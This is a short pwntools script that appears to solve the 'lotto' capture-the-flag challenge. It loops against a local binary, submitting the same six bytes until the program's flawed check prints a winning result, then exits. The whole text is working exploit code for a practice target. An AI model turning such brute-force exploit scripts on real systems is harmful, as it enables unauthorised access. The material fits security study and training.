from pwn import *

p = process('/home/lotto/lotto')
while(1):
    p.recvuntil("3. Exit\n")
    p.sendline('1')
    p.recvuntil("Submit your 6 lotto bytes : ")
    p.sendline('------')
    p.recvuntil('Lotto Start!\n')
    result = p.recvline()
    if 'bad' in result:
        continue
    else:
        print(result)
        break
p.recvuntil("3. Exit\n")
p.sendline('3')
p.close()